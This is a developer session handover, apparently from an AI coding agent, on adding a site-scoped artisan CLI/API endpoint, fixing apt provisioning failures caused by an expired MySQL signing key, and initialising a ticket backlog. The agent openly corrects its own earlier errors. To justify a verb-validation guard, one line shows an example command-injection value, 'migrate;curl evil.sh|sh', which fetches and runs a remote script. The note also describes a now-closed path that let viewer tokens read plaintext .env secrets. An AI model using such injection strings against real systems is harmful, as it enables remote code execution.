# Session handover — CLI artisan surface, provision apt resilience, Storybloq init

**Date:** 2026-09-04 · **Branch:** main · Working tree dirty (all changes below are uncommitted)

## What shipped

### 1. `dply site artisan` — site-scoped artisan from the CLI (T-004)

The question that started it: how do you run artisan on a server from the CLI? Answer at the time: you couldn't, except by shelling out through `dply server run` as the server's SSH user, with no risk gate and no audit trail. The site-aware engine (`RemoteCli\Services\Artisan`) existed but was reachable only from the control plane's own `php artisan dply:artisan`.

Built:

- `app/Http/Controllers/Api/SiteResourceApiController.php` — `runArtisan()` + `artisanRun()`, plus a private `artisanRunPayload()` that emits the SAME envelope as `dply:artisan --json` (`run_id`, `command`, `args`, `status`, `mode`, `risk`, `exit_code`, `stdout`, `stderr`) so both surfaces agree.
- `routes/api.php` — `POST /sites/{site}/artisan`, `GET /sites/{site}/artisan/runs/{run}` (constrained `[0-9]+`; the PK is a bigint and `find('abc')` throws on Postgres). Both behind `commands.run` via new `sites.artisan` / `sites.artisan_run` entries in `config/product/api_token_permissions.php`.
- `packages/dply-cli/src/site-commands.mjs` — `siteArtisan()`, waits by default (most useful commands are NOT in `instantCommands()`, so they queue), `--no-wait`, `--run <id>`, `--yes`, `--interval`, `--timeout`.
- `packages/dply-cli/src/cli.mjs` — `parse()` now treats a bare `--` as end-of-flags. Before this, `-- migrate --force` lost BOTH `--force` (parsed as a CLI flag) and `migrate` (eaten as the value of the `--` flag). `server run` inherits the fix.
- `app/Support/Cli/DplyCliCommandCatalog.php` — two rows.

Four guards, each there for a specific reason:

1. **Verb regex `^[A-Za-z][A-Za-z0-9:_.-]*$`.** `Artisan::buildShellCommand()` escapes args but interpolates the verb RAW. Fine for operator argv; an API token is not that. `migrate;curl evil.sh|sh` would otherwise reach the remote shell.
2. **`env`/`env:show`/`env:decrypt`/`tinker` require site UPDATE.** The engine classifies the env family as `Read`, and `RemoteCliPermissions` lets Read through on `SitePolicy::view` — which a workspace viewer holds. That was a token path to plaintext `.env` (DB password, `APP_KEY`). Confirmed against `Workspace::userCanUpdate` in a test.
3. **Destructive → 422 `confirmation_required`**, CLI prompts and retries with `confirm: true`. Same shape as the firewall's `ssh_lockout_ack_required`, so no new convention.
4. **Non-`vm_ssh` runtimes → 422.** `LaravelConsoleExecutor::executionProfile()`; the engine shells into the site root over SSH, so a container site would queue a job that dies on the box.

Tests: `tests/Feature/Api/SiteArtisanApiTest.php` (8). `LaravelConsoleExecutor` is `final` — do not try to mock it; the test builds a real `vm_ssh` site instead (`Server::factory()->ready()` + ssh key + `meta.vm_runtime.detected.framework = laravel`), which is closer to the real thing anyway.

### 2. Provision died on an expired third-party apt key (ISS-001, ISS-002)

Reported symptom: a server install failed right after `[dply] installing mise via apt`. Three separate causes stacked up.

- **The kill:** `MiseInstallScriptBuilder` ran a bare `apt-get update -y`. Under the preamble's `set -euo pipefail`, apt's non-zero exit from ANY failing repo aborts the step. Every other in-provision step uses `dply_apt_update`. → now uses it too. (`installLines()` is provision-only; the day-two paths call `installRuntimeForUserLines`, so the preamble helper is always in scope.)
- **The poison:** `BuildsProvisionDatabaseStack::pinMysqlSeries()` had added `/etc/apt/sources.list.d/dply-mysql.list` signed by `RPM-GPG-KEY-mysql-2023`, which apt now reports as `EXPKEYSIG B7B3B788A8D3785C`. Every later `apt-get update` on that box failed.
- **The dead self-heal:** the existing fallback read `if ! dply_apt_update; then rm -f …dply-mysql.list`. `dply_apt_update` returns 0 on EVERY path by design, so that branch could never fire. → added `DPLY_APT_UPDATE_STATUS` (0 clean / 1 still erroring) while keeping the return value 0; the MySQL block now tests the sentinel. Making the helper return non-zero would abort every step that calls it bare — the exact bug being fixed.

Then generalized it: `dply_prune_unverifiable_apt_sources` in the preamble drops any source that can never verify. Narrow on purpose — signature failures only (`EXPKEYSIG`/`KEYEXPIRED`/`NO_PUBKEY`/"is not signed"), only after the retries, `sources.list.d` only, and never the distro mirrors (those get a loud "needs a human" and stay). `DPLY_APT_ROOT` is a test seam.

Tests: `tests/Unit/Services/ProvisionAptUpdateResilienceTest.php` (4, incl. `bash -n` on the generated script) and `tests/Unit/Jobs/ProvisionAptSourcePrunerTest.php` (3, which run the emitted function as real bash against a temp apt tree using the droplet's actual log).

### 3. Storybloq initialized

Empty `.story/` scaffold → 5 phases, 18 tickets, 5 issues, tests-only pipeline (`composer test`). Backlog was refined and then audited read-only by `codex exec --output-schema`, which returned `needs-changes` with 14 findings; see Decisions below for the two that mattered.

## Decisions and corrections

- **`server run` does not run as root.** I claimed it did, twice. `SshConnection::effectiveUsername()` (line 31) returns `server.ssh_user`, falling back to root only when empty. Any advice built on "it's root, so `sudo -u`" was wrong.
- **The shipped CLI is `packages/dply-cli` (Node)**, served as an npm tarball by `CliPackageTarballBuilder`. The sibling `../dply-cli` is a PHP/Laravel-Zero project that is NOT what users run — I pointed at it first and had to walk it back. Its `servers:run` sends a `user` field; the shipped CLI never does.
- **The 30s SSH ceiling is a house rule, not a measured limit.** `SshConnection::exec()` defaults to 120s; the real cap is the web request timeout. Codex caught the overstatement.
- **T-007 should use `ConsoleAction`, not `RemoteCliRun`.** The latter requires `site_id`; the former already models Server subjects, queued/failed states, actor ids and stall detection.
- **WordPress is not unimplemented** despite what README says — WP-CLI, hardening, cron switching, runtime detection and a workspace component all ship. T-018 is scoped as an ADR about a standalone SURFACE, and the stale README is ISS-005.

## State

All work is UNCOMMITTED on `main`. Modified: the three provisioning files, the site controller, `routes/api.php`, the abilities config, the CLI catalog, two CLI source files. New: four test files. `vendor/bin/pint --dirty` is clean; 42 provision tests + 8 artisan API tests + the CLI's 79 node tests pass. The full suite was NOT run (house rule).

**T-004 is recorded open even though its implementation landed here** — completion was not confirmed by the owner. The provisioning fixes have no ticket at all; they predate the backlog and survive as evidence inside ISS-001/ISS-002.

## Next

1. Decide T-004's status and whether the provisioning work gets a retroactive completed ticket.
2. `storybloq setup --client all` + client restart — MCP is unregistered, so `/story auto`, `/story orchestrate` and the session guard are unavailable; this session ran the CLI fallback path throughout.
3. T-001 is the live production bug: MySQL 8.4 is silently unreachable on every provision until the signing key source is fixed. T-002 covers hosts already carrying the dead source, which no script change reaches.
4. The affected droplet ("lookout") may still hold `/etc/apt/sources.list.d/dply-mysql.list`. A re-provision now prunes it automatically; before the fix it needed `rm -f /etc/apt/sources.list.d/dply-mysql.list /usr/share/keyrings/dply-mysql.gpg && apt-get update`.
